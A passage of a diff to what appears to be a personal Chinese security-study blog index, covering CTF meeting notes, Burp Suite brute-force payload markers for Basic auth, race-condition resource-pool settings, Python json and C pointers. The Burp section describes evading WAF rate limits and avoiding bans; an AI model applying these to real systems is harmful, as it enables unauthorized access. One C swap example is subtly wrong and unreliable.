+<h2 id="后期"><a href="#后期" class="headerlink" title="后期"></a>后期</h2><ul>
+<li><img src="/2025/03/30/3-30%E6%9C%89%E5%85%B3%E5%B7%9D%E5%A4%A7ctf%E4%BA%A4%E6%B5%81/image-20250330180254510.png" class="" title="image-20250330180254510"></li>
+<li>主要是个人研究工具</li>
+</ul>
+<h2 id="WP的来源"><a href="#WP的来源" class="headerlink" title="WP的来源"></a>WP的来源</h2><ul>
+<li><img src="/2025/03/30/3-30%E6%9C%89%E5%85%B3%E5%B7%9D%E5%A4%A7ctf%E4%BA%A4%E6%B5%81/image-20250330180517910.png" class="" title="image-20250330180517910"></li>
+</ul>
+<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h2><ul>
+<li><p>ctfwiki PWN相关内容</p>
+</li>
+<li><p>做题:</p>
+</li>
+<li><ul>
+<li><p>buuctf</p>
+</li>
+<li><p>Linux使用wsl即可</p>
+</li>
+<li><p>直接看X86汇编语言</p>
+</li>
+</ul>
+</li>
+<li><p>打公开赛的赛题,国际赛</p>
+</li>
+</ul>
+<h1 id="师傅的问题"><a href="#师傅的问题" class="headerlink" title="师傅的问题"></a>师傅的问题</h1><ul>
+<li>AWD的Web题一定要快速找到后门,不需要很高的web知识,<strong>比较好去稳定排名</strong></li>
+<li>在赛场上不好一个个处理靶机。</li>
+<li>对框架的定位，快速了解系统框架，得知漏洞点。在<code>github</code>的<code>CMS</code>进行研究。</li>
+<li>团队：</li>
+<li>两个web一个pwn。</li>
+</ul>
+<h1 id="其他问题"><a href="#其他问题" class="headerlink" title="其他问题"></a>其他问题</h1><ul>
+<li>不要在配置环境花费太多时间</li>
+<li>自己开发工具，实用性是不是会更高?</li>
+<li>主要工具用于渗透方向。</li>
+</ul>
+<h1 id="国安"><a href="#国安" class="headerlink" title="国安"></a>国安</h1><ul>
+<li>运气成分比较大</li>
+<li>老师理解就是，对专业要求不是很高。</li>
+<li>先了解具体时间。</li>
+</ul>
+<h1 id="省厅"><a href="#省厅" class="headerlink" title="省厅"></a>省厅</h1>]]></content>
       <categories>
-        <category>buuctf</category>
+        <category>个人安排</category>
       </categories>
       <tags>
-        <tag>文件上传</tag>
+        <tag>川大ctf交流</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>bp爆破中的变量赋值</title>
+    <url>/2025/01/13/bp%E7%88%86%E7%A0%B4%E4%B8%AD%E7%9A%84%E5%8F%98%E9%87%8F%E8%B5%8B%E5%80%BC/</url>
+    <content><![CDATA[<h3 id="有关密码用户名的提交"><a href="#有关密码用户名的提交" class="headerlink" title="有关密码用户名的提交"></a>有关密码用户名的提交</h3><ul>
+<li>密码提交：<br>比如在web容器内部有输入框让你输入admin和密码,这些数据提交进去是在HTTP请求报文或HTTP请求头中的Authorization结构(用于身份验证和授权信息传递),<br>可以发现admin与password之间使用:隔开,并且注意编码格式。</li>
+<li>变量赋值的提醒<br>变量赋值是用$$分开的,两个$符号之间的字符即为变量的值,比如:</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Authorization: Basic §a§:§password§</span><br></pre></td></tr></table></figure>
+<p><strong>注释</strong>:这里把冒号放在a变量里面:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Authorization: Basic $a:$$password$</span><br></pre></td></tr></table></figure>
+<p>也符合HTTP协议的格式。怎么顺眼怎么来</p>
+]]></content>
+      <categories>
+        <category>web安全</category>
+      </categories>
+      <tags>
+        <tag>bp爆破</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>bp资源池</title>
+    <url>/2025/04/12/bp%E8%B5%84%E6%BA%90%E6%B1%A0/</url>
+    <content><![CDATA[<h1 id="Resource-Pool-参数详解及其在条件竞争漏洞中的作用"><a href="#Resource-Pool-参数详解及其在条件竞争漏洞中的作用" class="headerlink" title="Resource Pool 参数详解及其在条件竞争漏洞中的作用"></a>Resource Pool 参数详解及其在条件竞争漏洞中的作用</h1><h2 id="1-Resource-Pool-的核心参数"><a href="#1-Resource-Pool-的核心参数" class="headerlink" title="1. Resource Pool 的核心参数"></a><strong>1. Resource Pool 的核心参数</strong></h2><p>Resource Pool 用于控制攻击时的资源分配和请求节奏，以下是关键参数及其作用：</p>
+<hr>
+<h5 id="a-最大并发请求数（Maximum-concurrent-requests）"><a href="#a-最大并发请求数（Maximum-concurrent-requests）" class="headerlink" title="a. 最大并发请求数（Maximum concurrent requests）"></a><strong>a. 最大并发请求数（Maximum concurrent requests）</strong></h5><ul>
+<li><strong>功能</strong>：控制同时发送的请求数量。</li>
+<li><strong>条件竞争中的作用</strong>：<ul>
+<li><strong>高并发</strong>：设置较高的并发数（如 50~100），可同时触发大量请求，<strong>增加竞争条件的触发概率</strong>（例如：同时修改同一账户余额）。</li>
+<li><strong>默认值问题</strong>：默认的 10 并发可能不足以触发某些敏感竞争漏洞，需根据目标系统承载能力调整。</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h5 id="b-请求延迟（Delay-between-requests）"><a href="#b-请求延迟（Delay-between-requests）" class="headerlink" title="b. 请求延迟（Delay between requests）"></a><strong>b. 请求延迟（Delay between requests）</strong></h5><ul>
+<li><strong>功能</strong>：定义每次请求之间的间隔时间（单位：毫秒）。</li>
+<li><strong>条件竞争中的作用</strong>：<ul>
+<li><strong>零延迟（0ms）</strong>：禁用延迟，请求连续发送，<strong>最大化并发压力</strong>，适合测试服务器在高并发下的异常行为。</li>
+<li><strong>固定延迟（Fixed）</strong>：若必须设置延迟，应尽可能小（如 10ms），避免因间隔过长导致竞争窗口关闭。</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h5 id="c-随机延迟（Random-variations）"><a href="#c-随机延迟（Random-variations）" class="headerlink" title="c. 随机延迟（Random variations）"></a><strong>c. 随机延迟（Random variations）</strong></h5><ul>
+<li><strong>功能</strong>：在固定延迟基础上增加随机波动（例如：固定 50ms + 随机 ±20ms）。</li>
+<li><strong>条件竞争中的作用</strong>：<ul>
+<li><strong>规避简单速率限制</strong>：随机化请求间隔，绕过基于固定频率的防御规则（如 WAF 的请求速率检测）。</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h5 id="d-延迟增量（Increase-delay-in-increments）"><a href="#d-延迟增量（Increase-delay-in-increments）" class="headerlink" title="d. 延迟增量（Increase delay in increments）"></a><strong>d. 延迟增量（Increase delay in increments）</strong></h5><ul>
+<li><strong>功能</strong>：每次请求后逐步增加延迟（例如：初始 10ms，每次增加 5ms）。</li>
+<li><strong>条件竞争中的作用</strong>：<ul>
+<li><strong>平衡攻击与隐蔽性</strong>：初期高并发快速触发竞争，后续逐步减缓，避免因持续高压被封锁。</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h5 id="e-自动限速（Automatic-throttling）"><a href="#e-自动限速（Automatic-throttling）" class="headerlink" title="e. 自动限速（Automatic throttling）"></a><strong>e. 自动限速（Automatic throttling）</strong></h5><ul>
+<li><strong>功能</strong>：根据服务器响应（如 429&#x2F;503 状态码）自动调整请求速率。</li>
+<li><strong>条件竞争中的作用</strong>：<ul>
+<li><strong>维持攻击持续性</strong>：当服务器返回限速状态码时，自动降低请求频率，避免被彻底封禁，<strong>延长攻击窗口期</strong>。</li>
+<li><strong>自定义状态码（CSV）</strong>：可针对特定错误码（如 504）调整策略，适应目标系统的独特响应。</li>
+</ul>
+</li>
+</ul>
+]]></content>
+      <categories>
+        <category>web安全</category>
+      </categories>
+      <tags>
+        <tag>bp爆破</tag>
       </tags>
   </entry>
   <entry>
@@ -1155,30 +1229,6 @@
       </tags>
   </entry>
   <entry>
-    <title>bp爆破中的变量赋值</title>
-    <url>/2025/01/13/bp%E7%88%86%E7%A0%B4%E4%B8%AD%E7%9A%84%E5%8F%98%E9%87%8F%E8%B5%8B%E5%80%BC/</url>
-    <content><![CDATA[<h3 id="有关密码用户名的提交"><a href="#有关密码用户名的提交" class="headerlink" title="有关密码用户名的提交"></a>有关密码用户名的提交</h3><ul>
-<li>密码提交：<br>比如在web容器内部有输入框让你输入admin和密码,这些数据提交进去是在HTTP请求报文或HTTP请求头中的Authorization结构(用于身份验证和授权信息传递),<br>可以发现admin与password之间使用:隔开,并且注意编码格式。</li>
-<li>变量赋值的提醒<br>变量赋值是用$$分开的,两个$符号之间的字符即为变量的值,比如:</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Authorization: Basic §a§:§password§</span><br></pre></td></tr></table></figure>
-<p><strong>注释</strong>:这里把冒号放在a变量里面:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Authorization: Basic $a:$$password$</span><br></pre></td></tr></table></figure>
-<p>也符合HTTP协议的格式。怎么顺眼怎么来</p>
-]]></content>
-      <categories>
-        <category>web安全</category>
-      </categories>
-      <tags>
-        <tag>bp爆破</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>c语言细节</title>
-    <url>/2025/02/08/c%E8%AF%AD%E8%A8%80%E7%BB%86%E8%8A%82/</url>
-    <content><![CDATA[]]></content>
-  </entry>
-  <entry>
     <title>c语言数值类型与字长的理解</title>
     <url>/2025/01/17/c%E8%AF%AD%E8%A8%80%E6%95%B0%E5%80%BC%E7%B1%BB%E5%9E%8B%E4%B8%8E%E5%AD%97%E9%95%BF%E7%9A%84%E7%90%86%E8%A7%A3/</url>
     <content><![CDATA[<h2 id="c语言数据类型"><a href="#c语言数据类型" class="headerlink" title="c语言数据类型"></a>c语言数据类型</h2><h3 id="数据声明与字长"><a href="#数据声明与字长" class="headerlink" title="数据声明与字长"></a>数据声明与字长</h3><p>1.首先字长是计算机可以处理的二进制数的位数,字节是基本单位,一字节等于8位,1位是0或1。</p>
@@ -1443,6 +1493,50 @@ void main()
       </categories>
       <tags>
         <tag>c语言标准库及其函数</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>c语言细节</title>
+    <url>/2025/02/08/c%E8%AF%AD%E8%A8%80%E7%BB%86%E8%8A%82/</url>
+    <content><![CDATA[]]></content>
+  </entry>
+  <entry>
+    <title>json学习</title>
+    <url>/2025/03/07/json%E5%AD%A6%E4%B9%A0/</url>
+    <content><![CDATA[<h1 id="json库学习"><a href="#json库学习" class="headerlink" title="json库学习"></a>json库学习</h1><h2 id="转码为dict格式文件"><a href="#转码为dict格式文件" class="headerlink" title="转码为dict格式文件"></a>转码为dict格式文件</h2><ul>
+<li>比如有以下python数据</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#综合数据集</span></span><br><span class="line">        decision_metadata = &#123;</span><br><span class="line">            <span class="string">&quot;model_version&quot;</span>: <span class="string">&quot;xgb_v3.1+bert_v2.4&quot;</span>,</span><br><span class="line">            <span class="string">&#x27;xgb_pred&#x27;</span>: xgb_pred,</span><br><span class="line">            <span class="string">&#x27;bert_pred&#x27;</span>: bert_pred,</span><br><span class="line">            <span class="string">&#x27;xgb_proba&#x27;</span>: xgb_proda,</span><br><span class="line">            <span class="string">&#x27;bert_proba&#x27;</span>: bert_proda,</span><br><span class="line">            <span class="string">&#x27;xgb_detailed_proda&#x27;</span>: xgb_detailed_proda,</span><br><span class="line">            <span class="string">&#x27;bert_detailed_proda&#x27;</span>: bert_detailed_proda,</span><br><span class="line">        &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>进行json格式转码，即，讲该字典格式数据编码为<code>json</code>格式数据</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">dc_metadata_json = json.dumps(decision_metadata)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>即采用，<code>json.dumps()</code>方法,当然，你要先使用<code>import json</code>的操作。</li>
+</ul>
+<h2 id="json格式数据写入txt文档"><a href="#json格式数据写入txt文档" class="headerlink" title="json格式数据写入txt文档"></a>json格式数据写入txt文档</h2><h3 id="步骤一：导入必要的模块"><a href="#步骤一：导入必要的模块" class="headerlink" title="步骤一：导入必要的模块"></a>步骤一：导入必要的模块</h3><p>需要导入<code>json</code>模块用于处理 JSON 数据。示例代码：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br></pre></td></tr></table></figure>
+
+<h3 id="步骤二：准备-JSON-格式的-Python-数据"><a href="#步骤二：准备-JSON-格式的-Python-数据" class="headerlink" title="步骤二：准备 JSON 格式的 Python 数据"></a>步骤二：准备 JSON 格式的 Python 数据</h3><p>JSON 数据在 Python 中通常以字典、列表等数据结构表示。例如：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;张三&quot;</span>,</span><br><span class="line">    <span class="string">&quot;age&quot;</span>: <span class="number">30</span>,</span><br><span class="line">    <span class="string">&quot;hobbies&quot;</span>: [<span class="string">&quot;阅读&quot;</span>, <span class="string">&quot;跑步&quot;</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="步骤三：将-JSON-数据转换为字符串"><a href="#步骤三：将-JSON-数据转换为字符串" class="headerlink" title="步骤三：将 JSON 数据转换为字符串"></a>步骤三：将 JSON 数据转换为字符串</h3><p>使用<code>json.dumps()</code>方法将 Python 中的 JSON 数据转换为字符串格式，方便写入 txt 文件。<code>json.dumps()</code>方法还可以通过一些参数进行格式化输出，如<code>indent</code>参数指定缩进，<code>ensure_ascii</code>参数设置是否以 ASCII 编码显示字符（<code>False</code>表示按原字符显示，常用于处理中文等非 ASCII 字符）。示例代码：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">json_str = json.dumps(data, indent=<span class="number">4</span>, ensure_ascii=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>
+
+<h3 id="步骤四：打开-txt-文件并写入数据"><a href="#步骤四：打开-txt-文件并写入数据" class="headerlink" title="步骤四：打开 txt 文件并写入数据"></a>步骤四：打开 txt 文件并写入数据</h3><p>使用<code>open()</code>函数以写入（<code>&#39;w&#39;</code>）或追加（<code>&#39;a&#39;</code>）模式打开 txt 文件。<code>&#39;w&#39;</code>模式会覆盖原有文件内容；<code>&#39;a&#39;</code>模式则会在文件末尾添加新内容，若文件不存在会自动创建。使用<code>write()</code>方法将转换后的 JSON 字符串写入文件，操作完成后文件会在<code>with</code>语句块结束时自动关闭。示例代码：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 以写入模式打开文件</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;output.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    file.write(json_str)</span><br><span class="line"><span class="comment"># 以追加模式打开文件</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;output.txt&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    file.write(json_str + <span class="string">&quot;\n&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>如果 JSON 数据原本存储在文件中，先读取该 JSON 文件再写入 txt 文件，示例如下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取JSON文件</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;input.json&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> json_file:</span><br><span class="line">    data = json.load(json_file)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将JSON数据转换为字符串</span></span><br><span class="line">json_str = json.dumps(data, indent=<span class="number">4</span>, ensure_ascii=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 写入txt文件</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;output.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> txt_file:</span><br><span class="line">    txt_file.write(json_str) </span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>python</category>
+      </categories>
+      <tags>
+        <tag>json库</tag>
       </tags>
   </entry>
   <entry>
@@ -1712,7 +1806,7 @@ void swap( int *p,int *q)
 *t=*p; *p=*q; *q=*t;
 &#125;
 //main()略..
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">* 这里的指针变量`t`虽然已经声明，但是没有指向任何一个内存地址，不可以用来存放其他变量的值</span><br><span class="line"></span><br><span class="line">* 比如:</span><br><span class="line"></span><br><span class="line">* ```c</span><br><span class="line">  #include &lt;stdio.h&gt;</span><br><span class="line">  #include &lt;stdlib.h&gt;</span><br><span class="line">  </span><br><span class="line">  void swap(int *p,int *q)</span><br><span class="line">  &#123;int *t;</span><br><span class="line">   t = (int *)malloc(sizeof(int));</span><br><span class="line">   *t = *q,*p = *q,*q = *t;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">* 如该代码，指针变量`t`初始已经指向了一个动态分配的地址，可以用于接收变量。</span><br><span class="line"></span><br><span class="line">#### 指针的赋值</span><br><span class="line"></span><br><span class="line">* C语言中专辑可以把变量地址赋值给同类型的指针变量，**不可以把变量和表达式地址赋值给指针**</span><br><span class="line">* 可以通过类型强制转换把一种类型的指针变量赋值给另外一种类型的指针变量。</span><br><span class="line"></span><br><span class="line">#### 函数中的操作</span><br><span class="line"></span><br><span class="line">* 比如:</span><br><span class="line"></span><br><span class="line">* ```c</span><br><span class="line">  #include &lt;stdio.h&gt;</span><br><span class="line">  </span><br><span class="line">  void swap(int * a,int * b)&#123; //这里的&#x27;*&#x27;符号，只是代表我们正在定义指针</span><br><span class="line">      int t = *a;</span><br><span class="line">      *a = *b;</span><br><span class="line">      *b = t;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  int main()&#123;</span><br><span class="line">      int a = 6;</span><br><span class="line">      int b = 3;</span><br><span class="line">      </span><br><span class="line">      printf(&quot;%d，%d\n&quot;, a,b);</span><br><span class="line">      swap(&amp;a, &amp;b);//此时传入的值是指针</span><br><span class="line">      printf(&quot;%d，%d&quot;, a,b);</span><br><span class="line">      </span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">* 输出的结果为:</span><br><span class="line"></span><br><span class="line">* ```powershell</span><br><span class="line">  6，3</span><br><span class="line">  3，6</span><br><span class="line"></span><br><span class="line">* 我们可以进一步说明:</span><br><span class="line"></span><br><span class="line">* ```c</span><br><span class="line">  #include &lt;stdio.h&gt;</span><br><span class="line">  </span><br><span class="line">  void swap(int  a,int  b)&#123; //这里的&#x27;&#x27;符号，只是代表我们正在定义指针</span><br><span class="line">      int t = a;</span><br><span class="line">      a = b;</span><br><span class="line">      b = t;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  int main()&#123;</span><br><span class="line">      int a = 6;</span><br><span class="line">      int b = 3;</span><br><span class="line">      </span><br><span class="line">      printf(&quot;%d，%d\n&quot;, a,b);</span><br><span class="line">      swap(a, b);//此时传入的值是指针</span><br><span class="line">      printf(&quot;%d，%d&quot;, a,b);</span><br><span class="line">      </span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">* 比如上述代码，就和我们的第一组代码有差异,这里没有使用指针对变量地址进行赋值,所以输出的值为:</span><br><span class="line"></span><br><span class="line">* ```powershell</span><br><span class="line">  6，3</span><br><span class="line">  6，3</span><br><span class="line"></span><br><span class="line">* 你可以发现，它的值并没有进行调换，所以:**只有修改变量地址才是真正的修改变量的值**。</span><br><span class="line"></span><br><span class="line">#### 数组中的操作</span><br><span class="line"></span><br><span class="line">##### 基础概念:</span><br><span class="line"></span><br><span class="line">* * 数组是一个常量：</span><br><span class="line"></span><br><span class="line">  * ```c</span><br><span class="line">    #include &lt;stdio.h&gt;</span><br><span class="line">    </span><br><span class="line">    int main()&#123;</span><br><span class="line">        int a = 6;</span><br><span class="line">        int b = 3;</span><br><span class="line">        int c[3] = &#123;1,2,3&#125;;</span><br><span class="line">    </span><br><span class="line">        c = &amp;a;</span><br><span class="line">    </span><br><span class="line">        printf(&quot;%d&quot;, c);</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  * 像这样进行赋值，就会报错。</span><br><span class="line"></span><br><span class="line">* 对于数组的本质</span><br><span class="line"></span><br><span class="line">* * 简单来说，**数组和指针的本质区别就是，前者为常量，不可以赋值，后者为变量，可以被赋值，**其他操作方式其实都大同小异。</span><br><span class="line"></span><br><span class="line">  * 比如我们可以看以下代码:</span><br><span class="line"></span><br><span class="line">  * ```c</span><br><span class="line">    #include &lt;stdio.h&gt;</span><br><span class="line">    </span><br><span class="line">    int main()&#123;</span><br><span class="line">        int a = 6;</span><br><span class="line">        int b = 3;</span><br><span class="line">        int c[3] = &#123;1,2,3&#125;;</span><br><span class="line">    </span><br><span class="line">        printf(&quot;%d&quot;, *c);</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  * 这里就是对类似于指针的数组`c`进行了解包,但是默认解包出来的数是数组的第一个数，即`1`,若要对下一位数进行解包,可以这样进行解包:`printf(&quot;%d&quot;, *(c+1))&#x27;;`会输出:`2` 相当于:`+1`是为了移位,`*`是为了解包。</span><br><span class="line"></span><br><span class="line">  * 这里我们可以知道一个规律是怎么来的了:**为什么编程语言的索引都是从0开始?**因为,在c语言中；对于数组`c`,`*(c+1)`和`c[1]`都是一个道理,为了保证形式上的相同，所以这样干。**数组索引不可以使用&#x27;()&#x27;**</span><br><span class="line"></span><br><span class="line">  * 我们这里可以继续说:</span><br><span class="line"></span><br><span class="line">  * ```c</span><br><span class="line">    #include &lt;stdio.h&gt;</span><br><span class="line">    </span><br><span class="line">    int main()&#123;</span><br><span class="line">        int a = 6;</span><br><span class="line">        int b = 3;</span><br><span class="line">        int c[3] = &#123;1,2,3&#125;;</span><br><span class="line">    </span><br><span class="line">        int * p = c;</span><br><span class="line">    </span><br><span class="line">        printf(&quot;%d&quot;, p[1]);</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  * 这里一样可以把指针`p`当成数组进行索引分配。输出`2`。</span><br><span class="line"></span><br><span class="line">  ##### 指针数组:</span><br><span class="line"></span><br><span class="line">  * &#123;% asset_img image-20250302175735900.png image-20250302175735900 %&#125;</span><br><span class="line"></span><br><span class="line">* 这里我们出现了疑问:为什么我们使用int a = 6;int * p = a就会出错，而使用b = &#123;1,2,3&#125;;int * p = b;就不会出错呢,数组就不出错?</span><br><span class="line"></span><br><span class="line">* 原因如下:</span><br><span class="line"></span><br><span class="line">* `int a = 6; int *p = a;` 出错原因</span><br><span class="line"></span><br><span class="line">  - `int *p` 声明了一个指针变量`p`，指针变量是用来存储内存地址的，它要求赋值给它的应该是一个合法的内存地址。</span><br><span class="line">  - 而`int a = 6;` 定义了一个整型变量`a`并初始化为`6`，`6`只是一个普通的整数值，并非内存地址，所以直接将`a`的值赋给指针变量`p`，会导致类型不匹配错误，编译器会报错。正确的做法应该是将`a`的地址赋给`p`，即`int *p = &amp;a;`，这里`&amp;`是取地址运算符，`&amp;a`表示获取变量`a`在内存中的地址。</span><br><span class="line"></span><br><span class="line">* 数组情况不出错的原因。</span><br><span class="line"></span><br><span class="line">  - 在 C 语言中，数组名在表达式中使用时，会被隐式转换为指向数组首元素的指针。当定义`int b[] = &#123;1,2,3&#125;;` 时，`b` 代表数组`b`的首地址，它的类型本质上是`int *` （指向`int`类型的指针） 。</span><br><span class="line">  - 所以`int *p = b;` 这种写法是将数组`b`的首地址赋值给指针变量`p`，两者类型匹配，因此不会出错，此时`p`就指向了数组`b`的第一个元素，可以通过`p`来操作数组元素，比如`p[0]` 等价于`b[0]` ，都表示访问数组的第一个元素`1`。</span><br><span class="line">  </span><br><span class="line">* **这里我们可以进行一个总结：**</span><br><span class="line"></span><br><span class="line">* * 在 C 语言中对于数组`a[3]` ，在很多情况下数组名`a`会被隐式转换为指向数组首元素的地址：</span><br><span class="line"></span><br><span class="line">    - **赋值场景**：当把数组名赋值给指针变量时，如`int *p = a;` ，这里数组名`a`就被当作指向数组首元素`a[0]`的地址，将该地址赋给指针`p` ，使`p`也指向数组首元素。</span><br><span class="line">    - **表达式场景**：在涉及地址计算和操作的表达式中，例如`a + 1`，这里`a`同样被视为指向数组首元素的地址，`a + 1`表示指向数组第二个元素`a[1]`的地址 。</span><br><span class="line">    - **函数参数传递场景**：当数组作为函数参数时，比如定义函数`void func(int arr[])` ，调用`func(a)` ，实际上传递给函数的是数组`a`首元素的地址，在函数内部`arr`就相当于一个指向传入数组首元素的指针。</span><br><span class="line"></span><br><span class="line">    不过要注意，数组名在`sizeof`运算符中例外，`sizeof(a)`得到的是整个数组占用的字节数，此时`a`不被当作指针，而是代表整个数组 。</span><br><span class="line"></span><br><span class="line">* 对于指针与数组:</span><br><span class="line"></span><br><span class="line">* * 比如:`int *p = a `,这里也是把数组`a`首位元素地址赋值给了新定义的整型指针`p`,然后我们就可以用:`a[i]`以及`*(a+i)`、`*(p+i)`、`p[i]`这些方法对元素进行移动要注意:没有`*a[i]`或`*p[i]`的写法。</span><br><span class="line"></span><br><span class="line">#### 指针数组与高维数组的详细理解</span><br><span class="line"></span><br><span class="line">* 例子:</span><br><span class="line"></span><br><span class="line">* ```c</span><br><span class="line">  #include &lt;stdio.h&gt;</span><br><span class="line">  </span><br><span class="line">  int main()&#123;</span><br><span class="line">      int a[3][4] = &#123;&#123;1,2,3,4&#125;,&#123;5,6,7,8&#125;,&#123;9,10,11,12&#125;&#125;, *ap[3];</span><br><span class="line">  </span><br><span class="line">      for(int i=0; i&lt;3; i++)&#123;</span><br><span class="line">          ap[i] = a[i];</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">      printf(&quot;%d&quot;, **(ap+1));//这一行可以改为:*(ap+1),ap[1],*ap[1],*(ap[1]+1)</span><br><span class="line">  </span><br><span class="line">      return 0;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">* 首先对于`for(int i=0; i&lt;3; i++)`这行代码:</span><br><span class="line"></span><br><span class="line">* * 在高维数组中(比如这里的二维数组),这里a[i]就是第i行的第一个数字的地址。</span><br><span class="line">  * 而ap[i]是一个指针,(类型:`*int`)在这里,就把就是第i行的第一个数字的**地址**赋值给了`ap[i]`,如果是字符串的话,比如:`str[2][10] = &#123;&quot;aaa&quot;,&quot;bbbbb&quot;&#125;`，这种，要让指针数组(`strp`),指向数组:`strp[i] = str[i]`，那么这里指针代表的是蒂耶戈字符串所有的地址。</span><br><span class="line">  * 而`ap`代表的就是指向元素为指针的数组的首位元素，即指针的指针:类型:`**int`,所以，要进行两次解包才行:`**(ap+1)`</span><br><span class="line">  * 所以ap[1]呈现出来的是一个地址而非具体值，因为数组`ap`的元素是指针，指向了地址,这里就和一维数组不一样，一维数组使用这样的中括号索引就是具体值，而在指针数列里，这里的具体值则是地址，所以，我使用`*ap[1]`就会得到具体值</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#### 指针数组以及指针的指针</span><br><span class="line"></span><br><span class="line">##### 指针数组</span><br><span class="line"></span><br><span class="line">* 比如:</span><br><span class="line">* &#123;% asset_img image-20250303075709855.png image-20250303075709855 %&#125;</span><br><span class="line">* 使用语法`char *s[6]`就是定义一个指针数组并且对其初始化,6个指针分别对应6个字符串。</span><br><span class="line"></span><br><span class="line">#### 自定义数据结构里面的指针</span><br><span class="line"></span><br><span class="line">* 有以下例题:</span><br><span class="line">* &lt;style&gt;.qzlwwegxtuga&#123;zoom:150%;&#125;&lt;/style&gt;&#123;% asset_img qzlwwegxtuga image-20250305135039466.png &#x27;&quot;&quot;&quot;image-20250305135039466&quot;&#x27; %&#125;</span><br><span class="line">* 要点一:对于`struct st a[3] = &#123;5,&amp;a[0], 6,&amp;a[1], 7,&amp;a[2]&#125;, *p;`这里由于该结构在初始化的时候，需要两个值来初始化，所以`5,&amp;a[0]`就构成了数组`a`的第一个元素`a[0]`的初始化内容 ，`6,&amp;a[1]` 、`7,&amp;a[2]`分别对应`a[1]`和`a[2]`的初始化内容。</span><br><span class="line">* 要点二:这里对`st`数据结构数组的值的导入，比如:`5,&amp;a[0]`,这里第二个值为`&amp;a[0]`，就是对`st *next`的赋值，即指向的下一个元素是它本身。</span><br><span class="line">* 要点三:指针的数据结构必须和要指向的目标元素的类型相同，才可以进行指向。</span><br><span class="line">* 要点四:`p=&amp;a[0]`,这里就是指向数组a的第一个元素的的地址，包含：`(int n ,struct st *next)`,我们对指针进行移动:`(++p)`,再进行指向:`-&gt;`,**其中:`-&gt;`这个方法就已经对数据结构其中的元素进行了解包**,所以不需要`*p`对数据解包了。</span><br><span class="line"></span><br><span class="line">#### 指针在动态内存中的操作</span><br><span class="line"></span><br><span class="line">* 如例题:</span><br><span class="line"></span><br><span class="line">* ```c</span><br><span class="line">  #include &lt;stdio.h&gt;</span><br><span class="line">  #include &lt;string.h&gt;</span><br><span class="line">  #include &lt;stdlib.h&gt;</span><br><span class="line">  void main()</span><br><span class="line">  &#123;</span><br><span class="line">      char *p1,*p2;</span><br><span class="line">      p1=p2=(char *)malloc(sizeof(char)*10);</span><br><span class="line">      strcpy(p1,&quot;malloc&quot;);</span><br><span class="line">      strcpy(p2,p1 + 1);</span><br><span class="line">      